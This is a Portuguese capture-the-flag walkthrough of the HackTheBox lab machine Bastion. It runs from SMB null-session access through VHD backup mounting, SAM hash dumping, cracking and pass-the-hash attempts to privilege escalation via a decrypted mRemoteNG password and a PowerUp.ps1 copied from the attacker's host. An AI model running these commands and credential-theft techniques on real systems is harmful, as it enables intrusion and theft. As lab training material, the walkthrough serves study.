Bastion
========================

    sudo nmap_enum bastion.htb | tee nmap_output.txt
    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn bastion.htb | tee nmap_udp_output.txt
    
    sudo nmap -p- -Pn -T5 -n bastion.htb | tee nmap_fullportstcp_output.txt
    
![qownnotes-media-FJOaiL](../../../media/qownnotes-media-FJOaiL.png)

![qownnotes-media-luXjvT](../../../media/qownnotes-media-luXjvT.png)

![qownnotes-media-GkFwSN](../../../media/qownnotes-media-GkFwSN.png)

    enum4linux -a -A 10.10.10.134
    
![qownnotes-media-VSNhGK](../../../media/qownnotes-media-VSNhGK.png)

![qownnotes-media-nCZeGr](../../../media/qownnotes-media-nCZeGr.png)

![qownnotes-media-HOVyEG](../../../media/qownnotes-media-HOVyEG.png)

![qownnotes-media-SZaKdX](../../../media/qownnotes-media-SZaKdX.png)

    smbclient -L //10.10.10.134

    smbclient -L //10.10.10.134 -U '' -N

O que chama a atenção é isso aqui ó:

![qownnotes-media-CMFgdQ](../../../media/qownnotes-media-CMFgdQ.png)

Com um comando funciona, mas com o outro não!
Mas já encontramos o ponto de partida:

NULL SESSION via SMB

# Exploitation

Para facilitar, montamos o share localmente na maquina com o seguinte comando:

    mount -t cifs //10.10.10.134/Backups /tmp/smb
    <ENTER>

![qownnotes-media-HVItYF](../../../media/qownnotes-media-HVItYF.png)

Com isso, da pra notar que existe uma maquina virtual armazenada neste share, entao temos de extrair os hashes de senha com isso. copiei a maquina para um diretorio local

![qownnotes-media-BdrtMj](../../../media/qownnotes-media-BdrtMj.png)

Agora, estou preparando a maquina para poder extrair o conteudo dos hashes de senha. Para tal, estou instalando uma ferramenta:
```
sudo apt install libguestfs-tools -y
sudo mkdir /mnt/tmp
guestmount --add /tmp/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/tmp
#isso nao funcionou. Tentei com root  
sudo guestmount --add /tmp/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/tmp
# So funcionou quando eu usei diretamente o do share mesmo desta forma:
```


```
sudo guestmount --add '/tmp/smb/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro -v /mnt/vhd
cp vhd/Windows/System32/config/SAM /home/acosta/Downloads
cp vhd/Windows/System32/config/SYSTEM /home/acosta/Downloads
impacket-secretsdump -sam SAM -system SYSTEM local

```
![qownnotes-media-DQPVtP](../../../media/qownnotes-media-DQPVtP.png)

Fiz alguns testes pra tentar shell com os hashes obtidos, mas sem chance:

    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 L4mpje@10.10.10.134
![qownnotes-media-tjcNBL](../../../media/qownnotes-media-tjcNBL.png)

![qownnotes-media-bRgbqo](../../../media/qownnotes-media-bRgbqo.png)

    evil-winrm -H 31d6cfe0d16ae931b73c59d7e0c089c0 -i 10.10.10.134 -u Administrator
    
Entao a solucao foi quebrar o hash de senha com o john

    cat hash.txt
    \26112010952d963c8dc4217daec986d9

![qownnotes-media-BYTebA](../../../media/qownnotes-media-BYTebA.png)

    john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt       
    
![qownnotes-media-bBinNC](../../../media/qownnotes-media-bBinNC.png)

    ssh L4mpje@10.10.10.134
    bureaulampje

L4mpje
`bureaulampje`

# Privilege Escalation

    whoami /all
    
    tasklist /svc
    
    systeminfo
    
![qownnotes-media-dJCqHC](../../../media/qownnotes-media-dJCqHC.png)

    netstat -na

![qownnotes-media-FethxA](../../../media/qownnotes-media-FethxA.png)

    schtasks /query /fo LIST /v

![qownnotes-media-Dzjrow](../../../media/qownnotes-media-Dzjrow.png)

Aqui vemos que so tem recursos do windows mesmo. Portanto temos que ir para um outra abordagem. 

    copy \\10.10.14.4\smb\PowerUp.ps1 pu.ps1
    powershell
    . .\pu.ps1
    invoke-allchecks
![qownnotes-media-wscwSg](../../../media/qownnotes-media-wscwSg.png)

Observe que essa DLL ai seria de um caminho do proprio usuario. Falso-positivo.

Em algumas oportunidades que consegui escalacao de privilegio nas maquinas eu notei que SeImpersonate e um cenario valido, no entanto tem varios outros que devo levar em consideracao, tais como 

1) Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio
2) checar credenciais no registro do windows
3) checar programas instalados na maquina por meio do program files ou program files (x86)
4) checar os servicos que estao rodando na maquina para ver se temos permissao de alteracao em algum deles
5) checar as scheduleds tasks
6) verificar se existe algum servico rodando em localhost para exploracao de escalacao de privilegio
7) em sistemas mais antigos, explorar vulnerabilidades de kernel
8) Ja peguei cenarios em que uma maquina virtual estava instalada na maquina e foi possivel obter credenciais no historico desta mesma maquina
9) Rodar o powerUp para verificar se existe algum servico disponivel para exploracao com permissoes demais. Aqui temos que usar o accesschk
10)  Testes mais basicos como testar a propria credencial do suuario ja comprometido para o Administrator tambem pode

Mas aqui quando entramos no "C:\Program Files(x86)" encontramos um tal de mRemoteNG. e vajma so...

    searchsploit mRemoteNG

![qownnotes-media-tRIPwq](../../../media/qownnotes-media-tRIPwq.png)

Com o exploit abaixo eu descriptografei a senha do usuario administrator e sucesso:

<https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py>

![qownnotes-media-VaPnNH](../../../media/qownnotes-media-VaPnNH.png)


    git clone https://github.com/kmahyyg/mremoteng-decrypt.git
    python mremoteng-decrypt/mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
    
![qownnotes-media-vSakjO](../../../media/qownnotes-media-vSakjO.png)

    impacket-psexec Administrator@10.10.10.134

Sucesso